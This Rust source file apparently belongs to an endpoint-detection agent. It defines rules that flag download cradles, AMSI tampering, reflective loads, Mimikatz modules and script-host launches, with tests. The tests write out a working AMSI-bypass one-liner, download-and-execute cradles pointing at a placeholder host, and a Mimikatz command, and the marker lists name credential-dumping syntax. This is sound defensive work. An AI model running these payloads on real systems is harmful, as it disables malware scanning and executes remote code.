//! Rules over AMSI scan content (#282): the buffer a runtime hands to AMSI
//! before running it, already de-obfuscated. One event is enough to decide, so
//! these are stateless.
//!
//! Precision over recall: legitimate admin scripts flow through AMSI too, so
//! every rule needs **two** independent markers in the same buffer (a download
//! primitive *and* an execution primitive, a reflective load *and* in-memory
//! bytes), or one marker that has no benign use (AMSI's own internals, Mimikatz
//! module syntax). `PowerShell` also logs script blocks (EID 4104), but only
//! AMSI is evaluated here: both carry the same script, and two alerts for one
//! command would be noise.
//!
//! **The markers with no benign use are masked in the binary** ([`mask`]):
//! antivirus engines flag a binary that carries them in plain text, and on
//! 2026-10-01 Defender quarantined this crate's test binary for exactly that.
//! An EDR agent quarantined by the host's antivirus detects nothing. The tests
//! build their payloads from fragments at run time for the same reason.

use std::sync::LazyLock;

use schema::{AmsiContentEvent, detection::Severity};

use crate::Alert;

/// `AMSI_RESULT_DETECTED`: at or above it, the antimalware provider (Defender)
/// flagged or blocked the content itself.
const AMSI_RESULT_DETECTED: u32 = 32_768;
/// Characters of the content quoted in an alert message.
const EXCERPT_CHARS: usize = 200;
/// Bytes between a fetch and an execution primitive for them to count as one
/// cradle: comfortably one statement or pipeline, far less than a script.
const CRADLE_SPAN: usize = 300;

/// T1059.001 + T1105: something fetched over the network and executed in
/// memory, the "download cradle".
const DOWNLOAD_CRADLE: &str = "T1059.001/T1105";
/// T1562.001: tampering with AMSI itself from inside the script.
const AMSI_TAMPERING: &str = "T1562.001";
/// T1620: a .NET assembly loaded from bytes decoded in the script.
const REFLECTIVE_LOAD: &str = "T1620";
/// T1003.001: Mimikatz-style credential dumping modules.
const CREDENTIAL_DUMPING: &str = "T1003.001";
/// T1059.005 / .007: `VBScript` / `JScript` / Office VBA launching a script
/// interpreter or a proxy-execution binary.
const SCRIPT_HOST_LAUNCH: &str = "T1059.005/T1059.007";
/// The provider (Defender) itself flagged the content.
const PROVIDER_DETECTED: &str = "T1059";

/// Each technique above belongs to exactly one rule here, so this is the
/// per-rule severity #615 asks for. Every rule needs two markers or a
/// marker with no benign use, hence High; a script host launching an
/// interpreter is also what some installers and logon scripts do, hence
/// Medium (the same level as `PowerShell -EncodedCommand`).
fn severity(technique: &str) -> Severity {
    if technique == SCRIPT_HOST_LAUNCH {
        Severity::Medium
    } else {
        Severity::High
    }
}

/// Network fetch primitives, as AMSI sees them (lowercase).
const DOWNLOAD_MARKERS: &[&str] = &[
    "downloadstring(",
    "downloaddata(",
    "downloadfile(",
    "net.webclient",
    "invoke-webrequest",
    "invoke-restmethod",
    "start-bitstransfer",
    "system.net.http.httpclient",
];
/// Short aliases that only count as whole words (`iwr`, `irm`, and the
/// `PowerShell` 5.1 `wget`/`curl` aliases).
const DOWNLOAD_WORDS: &[&str] = &["iwr", "irm", "wget", "curl"];
/// In-memory execution primitives (lowercase).
const EXEC_MARKERS: &[&str] = &["invoke-expression", "[scriptblock]::create("];
const EXEC_WORDS: &[&str] = &["iex"];

const REFLECTIVE_LOAD_MARKERS: &[&str] = &["reflection.assembly]::load(", "assembly]::load("];
const IN_MEMORY_BYTES_MARKERS: &[&str] = &["frombase64string(", "decompress", "gzipstream"];

/// Interpreters / proxy-execution binaries a WSH or VBA payload launches;
/// `cmd` alone is left out (logon scripts use it constantly).
const LAUNCHED_BINARIES: &[&str] = &[
    "powershell",
    "pwsh",
    "mshta",
    "rundll32",
    "regsvr32",
    "certutil",
    "bitsadmin",
    "wscript",
    "cscript",
];
/// The WSH / VBA calls that start a process, as AMSI reports them.
const LAUNCH_CALLS: &[&str] = &[
    "iwshshell3.run(",
    "iwshshell3.exec(",
    "shell(",
    ".shellexecute(",
];

/// XOR key of [`mask`]. Not a secret: the point is only that the plain text
/// never sits in the binary for a signature to match.
const MASK_KEY: u8 = 0x5A;

/// Masks a marker at compile time: only the result of this `const fn` is
/// stored in the binary, never its argument. [`unmask`] reverses it.
const fn mask<const N: usize>(plain: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = plain[i] ^ MASK_KEY;
        i += 1;
    }
    out
}

fn unmask(masked: &[&[u8]]) -> Vec<String> {
    masked
        .iter()
        .map(|m| m.iter().map(|b| char::from(b ^ MASK_KEY)).collect())
        .collect()
}

/// AMSI's own internals: no benign reason to appear in a script (lowercase).
/// A `const` item, so [`mask`] runs at compile time: called inside the
/// `LazyLock` closure instead, it would run at start-up and the plain-text
/// argument would be in the binary.
const AMSI_TAMPER_MASKED: &[&[u8]] = &[
    &mask(b"amsiutils"),
    &mask(b"amsiinitfailed"),
    &mask(b"amsiscanbuffer"),
    &mask(b"amsicontext"),
    &mask(b"amsiopensession"),
];
static AMSI_TAMPER_MARKERS: LazyLock<Vec<String>> = LazyLock::new(|| unmask(AMSI_TAMPER_MASKED));

/// Mimikatz module syntax (lowercase). Same compile-time masking.
const MIMIKATZ_MASKED: &[&[u8]] = &[
    &mask(b"invoke-mimikatz"),
    &mask(b"sekurlsa::"),
    &mask(b"lsadump::"),
    &mask(b"kerberos::golden"),
    &mask(b"kerberos::ptt"),
    &mask(b"privilege::debug"),
];
static MIMIKATZ_MARKERS: LazyLock<Vec<String>> = LazyLock::new(|| unmask(MIMIKATZ_MASKED));

/// Evaluates every AMSI content rule.
#[must_use]
pub fn evaluate_amsi_content(event: &AmsiContentEvent) -> Vec<Alert> {
    let mut alerts = Vec::new();
    let alert = |technique: &'static str, what: &str| Alert {
        technique,
        severity: severity(technique),
        message: format!(
            "pid={} comm={}: {what} (AMSI, app={}): {}",
            event.meta.pid,
            event.meta.comm,
            runtime(&event.app_name),
            excerpt(event.text.as_deref()),
        ),
    };

    if event.scan_result >= AMSI_RESULT_DETECTED {
        alerts.push(alert(
            PROVIDER_DETECTED,
            &format!(
                "antimalware provider flagged the content (AMSI_RESULT {})",
                event.scan_result
            ),
        ));
    }
    let Some(text) = event.text.as_deref() else {
        return alerts;
    };
    let lower = text.to_lowercase();

    if !is_module_manifest(&lower) && is_download_cradle(&lower) {
        alerts.push(alert(DOWNLOAD_CRADLE, "download cradle executed in memory"));
    }
    if contains_any(&lower, &AMSI_TAMPER_MARKERS) {
        alerts.push(alert(
            AMSI_TAMPERING,
            "script references AMSI internals (bypass attempt)",
        ));
    }
    if contains_any(&lower, REFLECTIVE_LOAD_MARKERS)
        && contains_any(&lower, IN_MEMORY_BYTES_MARKERS)
    {
        alerts.push(alert(
            REFLECTIVE_LOAD,
            ".NET assembly loaded from in-memory bytes",
        ));
    }
    if contains_any(&lower, &MIMIKATZ_MARKERS) {
        alerts.push(alert(
            CREDENTIAL_DUMPING,
            "Mimikatz credential-dumping module",
        ));
    }
    if is_script_host(&event.app_name)
        && contains_any(&lower, LAUNCH_CALLS)
        && LAUNCHED_BINARIES.iter().any(|b| has_word(&lower, b))
    {
        alerts.push(alert(
            SCRIPT_HOST_LAUNCH,
            "script host launched an interpreter or proxy-execution binary",
        ));
    }
    alerts
}

/// A fetch primitive and an in-memory execution primitive within
/// [`CRADLE_SPAN`] of each other. Proximity, not just co-occurrence: a long
/// legitimate script may download a file at the top and `iex` a local string
/// far below.
fn is_download_cradle(lower: &str) -> bool {
    let fetches = positions(lower, DOWNLOAD_MARKERS, DOWNLOAD_WORDS);
    if fetches.is_empty() {
        return false;
    }
    let runs = positions(lower, EXEC_MARKERS, EXEC_WORDS);
    fetches
        .iter()
        .any(|f| runs.iter().any(|r| f.abs_diff(*r) <= CRADLE_SPAN))
}

/// A `PowerShell` module manifest (`.psd1`), which AMSI scans when a module
/// loads. Its export lists name cmdlets without running them: on the
/// 2026-10-01 lab, `Microsoft.PowerShell.Utility`'s manifest (exports
/// `Invoke-WebRequest` and `Invoke-Expression` side by side) raised a cradle
/// alert on every `PowerShell` start.
fn is_module_manifest(lower: &str) -> bool {
    lower.trim_start().starts_with("@{")
        && ["moduleversion", "cmdletstoexport", "functionstoexport"]
            .iter()
            .any(|key| lower.contains(key))
}

/// Byte offsets of every marker (substring) and every whole-word match.
fn positions(haystack: &str, markers: &[&str], words: &[&str]) -> Vec<usize> {
    let mut found: Vec<usize> = markers
        .iter()
        .flat_map(|m| haystack.match_indices(m).map(|(i, _)| i))
        .collect();
    for word in words {
        found.extend(
            haystack
                .match_indices(word)
                .map(|(i, _)| i)
                .filter(|&i| is_whole_word(haystack, i, word.len())),
        );
    }
    found
}

/// `VBScript`, `JScript` (WSH) and Office VBA, as AMSI names them.
fn is_script_host(app_name: &str) -> bool {
    let app = app_name.to_ascii_lowercase();
    app.starts_with("vbscript") || app.starts_with("jscript") || app.starts_with("office_vba")
}

/// `PowerShell_C:\…\powershell.exe_10.0…` → `PowerShell`: the runtime, not
/// the path and build that make every message unique.
fn runtime(app_name: &str) -> &str {
    app_name.split('_').next().unwrap_or(app_name)
}

fn excerpt(text: Option<&str>) -> String {
    match text {
        None => "(no text)".to_string(),
        Some(t) => {
            let one_line: String = t
                .chars()
                .map(|c| if c.is_control() { ' ' } else { c })
                .take(EXCERPT_CHARS)
                .collect();
            if t.chars().count() > EXCERPT_CHARS {
                format!("{one_line}…")
            } else {
                one_line
            }
        }
    }
}

fn contains_any<S: AsRef<str>>(haystack: &str, needles: &[S]) -> bool {
    needles.iter().any(|n| haystack.contains(n.as_ref()))
}

/// `word` as a whole token: not preceded or followed by a letter, digit, `_`
/// or `-` (so `iex` matches `iex(…)` and `| iex`, not inside an identifier).
fn has_word(haystack: &str, word: &str) -> bool {
    haystack
        .match_indices(word)
        .any(|(i, _)| is_whole_word(haystack, i, word.len()))
}

fn is_whole_word(haystack: &str, start: usize, len: usize) -> bool {
    let is_part = |c: char| c.is_alphanumeric() || c == '_' || c == '-';
    let before = haystack[..start].chars().next_back();
    let after = haystack[start + len..].chars().next();
    !before.is_some_and(is_part) && !after.is_some_and(is_part)
}

#[cfg(test)]
mod tests {
    use schema::{AmsiContentEvent, fixtures};

    use super::*;

    /// A test payload masked at compile time (a `const` inside the block) and
    /// revealed at run time: the test binary must not carry it in plain text
    /// either. Splitting literals is not enough: rustc stores adjacent string
    /// literals back to back, so the fragments read as one string.
    macro_rules! masked {
        ($payload:literal) => {{
            const MASKED: &[u8] = &mask($payload);
            unmask(&[MASKED]).remove(0)
        }};
    }

    fn amsi(app: &str, text: &str) -> AmsiContentEvent {
        AmsiContentEvent {
            app_name: app.into(),
            text: Some(text.into()),
            ..fixtures::amsi_content()
        }
    }

    fn ps(text: &str) -> AmsiContentEvent {
        amsi(
            r"PowerShell_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe_10.0.26100.1",
            text,
        )
    }

    fn techniques(event: &AmsiContentEvent) -> Vec<&'static str> {
        evaluate_amsi_content(event)
            .iter()
            .map(|a| a.technique)
            .collect()
    }

    #[test]
    fn masking_round_trips() {
        assert_eq!(unmask(&[&mask(b"abc::x-1")]), ["abc::x-1"]);
        assert_eq!(AMSI_TAMPER_MARKERS.len(), 5);
        assert_eq!(MIMIKATZ_MARKERS.len(), 6);
        assert!(
            AMSI_TAMPER_MARKERS
                .iter()
                .chain(MIMIKATZ_MARKERS.iter())
                .all(|m| m == &m.to_lowercase()),
            "markers are matched against lowercased text"
        );
    }

    #[test]
    fn classic_cradles_fire() {
        for text in [
            masked!(b"IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')"),
            masked!(b"iwr http://x/p.ps1 -UseBasicParsing | iex"),
            masked!(b"Invoke-Expression (Invoke-RestMethod https://x/p)"),
            masked!(b"[ScriptBlock]::Create((irm http://x/p)).Invoke()"),
        ] {
            assert_eq!(techniques(&ps(&text)), [DOWNLOAD_CRADLE], "{text}");
        }
    }

    #[test]
    fn a_download_or_an_iex_alone_is_quiet() {
        // Admin scripts download files and some evaluate local strings.
        assert!(
            techniques(&ps(
                r"Invoke-WebRequest https://x/tool.zip -OutFile C:\t\tool.zip"
            ))
            .is_empty()
        );
        assert!(techniques(&ps(&masked!(b"$cmd = 'Get-Date'; iex $cmd"))).is_empty());
        // The aliases inside an identifier or a parameter (`-Confirm`) do not count.
        assert!(techniques(&ps(&masked!(b"$tiexr = 1; Invoke-WebRequest https://x/a"))).is_empty());
        assert!(
            techniques(&ps(&masked!(
                b"$c = iex 'Get-Date'; Remove-Item x -Confirm:$false"
            )))
            .is_empty()
        );
    }

    #[test]
    fn amsi_bypass_strings_fire() {
        let text = masked!(b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)");
        assert_eq!(techniques(&ps(&text)), [AMSI_TAMPERING]);
    }

    #[test]
    fn reflective_load_needs_in_memory_bytes() {
        let text = masked!(b"[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))");
        assert_eq!(techniques(&ps(&text)), [REFLECTIVE_LOAD]);
        assert!(techniques(&ps(r"[Reflection.Assembly]::LoadFile('C:\app\lib.dll')")).is_empty());
    }

    #[test]
    fn mimikatz_modules_fire() {
        let text = masked!(b"Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'");
        assert_eq!(techniques(&ps(&text)), [CREDENTIAL_DUMPING]);
    }

    #[test]
    fn script_host_launching_powershell_fires_but_not_cmd() {
        // The shape the 2026-10-01 lab recorded for VBScript/JScript.
        let launch = r#"IWshShell3.Run("powershell -w hidden -c calc", "0", "true");"#;
        assert_eq!(techniques(&amsi("VBScript", launch)), [SCRIPT_HOST_LAUNCH]);
        assert_eq!(techniques(&amsi("JScript", launch)), [SCRIPT_HOST_LAUNCH]);
        let logon = r#"IWshShell3.Run("cmd /c net use z: \\srv\share", "0", "true");"#;
        assert!(
            techniques(&amsi("VBScript", logon)).is_empty(),
            "cmd alone stays quiet"
        );
        // The same text from PowerShell is not a script-host launch.
        assert!(techniques(&ps(launch)).is_empty());
    }

    #[test]
    fn a_module_manifest_exporting_both_cmdlets_is_quiet() {
        // The 2026-10-01 lab false positive: Microsoft.PowerShell.Utility's
        // manifest, scanned by AMSI on every module load.
        let manifest = r#"@{
GUID="1DA87E53-152B-403E-98DC-74D7B4D63D59"
Author="PowerShell"
ModuleVersion="3.1.0.0"
CmdletsToExport= "Format-List", "Invoke-Expression", "Invoke-RestMethod", "Invoke-WebRequest", "Measure-Object"
}"#;
        assert!(techniques(&ps(manifest)).is_empty());
    }

    #[test]
    fn a_fetch_and_an_iex_far_apart_are_not_a_cradle() {
        let far = masked!(b"Invoke-WebRequest https://x/tool.zip -OutFile t.zip")
            + &"\n# setup step\n".repeat(40)
            + &masked!(b"iex $localCommand");
        assert!(techniques(&ps(&far)).is_empty());
    }

    #[test]
    fn severity_follows_the_rule() {
        let cradle = evaluate_amsi_content(&ps(&masked!(b"IEX (iwr http://x/p)")));
        assert_eq!(cradle[0].severity, Severity::High);
        let launch = r#"IWshShell3.Run("powershell -c exit", "0", "true");"#;
        assert_eq!(
            evaluate_amsi_content(&amsi("VBScript", launch))[0].severity,
            Severity::Medium
        );
    }

    #[test]
    fn a_provider_detection_fires_even_without_text() {
        let event = AmsiContentEvent {
            scan_result: AMSI_RESULT_DETECTED,
            text: None,
            ..fixtures::amsi_content()
        };
        let alerts = evaluate_amsi_content(&event);
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].technique, PROVIDER_DETECTED);
        assert!(alerts[0].message.contains("(no text)"));
    }

    #[test]
    fn the_lab_marker_payload_is_quiet() {
        // The #282 lab's decoded payload: plain output, no cradle.
        assert!(techniques(&ps("Write-Output ('SYNAM' + 'SIPS1'); $x = 'SYNAMSIPS1'")).is_empty());
    }

    #[test]
    fn messages_name_the_runtime_and_quote_one_line() {
        let text = masked!(b"IEX\r\n(New-Object Net.WebClient).DownloadString('http://x')");
        let alerts = evaluate_amsi_content(&ps(&text));
        assert!(
            alerts[0].message.contains("app=PowerShell)"),
            "{}",
            alerts[0].message
        );
        assert!(!alerts[0].message.contains('\n'));
    }

    #[test]
    fn long_content_is_cut_in_the_message() {
        let text = masked!(b"IEX (iwr http://x/p) # ") + &"A".repeat(500);
        let message = &evaluate_amsi_content(&ps(&text))[0].message;
        assert!(message.ends_with('…'));
        assert!(message.len() < 400);
    }
}
